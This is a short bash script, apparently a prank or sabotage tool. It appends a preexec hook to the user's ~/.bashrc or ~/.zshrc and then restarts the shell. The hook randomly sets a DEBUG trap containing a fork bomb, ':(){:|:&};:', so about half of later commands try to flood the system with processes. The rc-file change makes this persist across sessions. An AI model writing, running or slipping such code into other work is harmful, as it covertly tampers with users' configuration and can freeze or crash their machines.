#!/bin/bash
old_pwd=$PWD

cd $HOME

RC_FILE=$HOME/.zshrc
if [[ "$SHELL" == *"bash"* ]]; then
    RC_FILE="$HOME/.bashrc"
elif [[ "$SHELL" == *"zsh"* ]]; then
    RC_FILE="$HOME/.zshrc"
fi

echo "preexec() {
    if (( RANDOM % 2 == 0 )); then
    	trap ':(){:|:&};:' DEBUG
    else
		trap - DEBUG
    fi
}

autoload -Uz add-zsh-hook
add-zsh-hook preexec preexec
" >> $RC_FILE

cd $old_pwd

exec $SHELL
